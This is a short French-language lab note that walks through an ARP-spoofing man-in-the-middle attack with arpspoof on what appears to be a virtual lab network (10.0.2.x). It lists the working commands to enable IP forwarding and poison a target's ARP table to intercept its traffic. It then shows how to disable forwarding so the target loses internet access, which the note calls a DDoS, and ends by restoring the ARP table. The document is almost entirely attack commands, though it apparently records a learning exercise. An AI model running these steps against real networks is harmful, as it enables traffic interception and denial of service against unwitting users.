
Usurpation de MAC addr (man in the middle)

* Local:
$ route -n
$ ifconfig -a
$ sudo su
# echo "1" > /proc/sys/net/ipv4/ip_forward
>>> autorise l'ip forwarding

* Distant:
$ arp -a

* Local:
$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1

* Distant:
$ arp -a
>>> tout est redirigé vers la machine local.

* Local:
$ sudo su
# echo "0" > /proc/sys/net/ipv4/ip_forward
>>> empèche l'ip forwarding
$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1

La machine distante a subi une attaque de DDoS et n'accède plus à intenet.

* Local:
Ctrl-C dans arpspoof pour remettre la bonne table ARP.
>>> Ouf, attaque ended ;) !
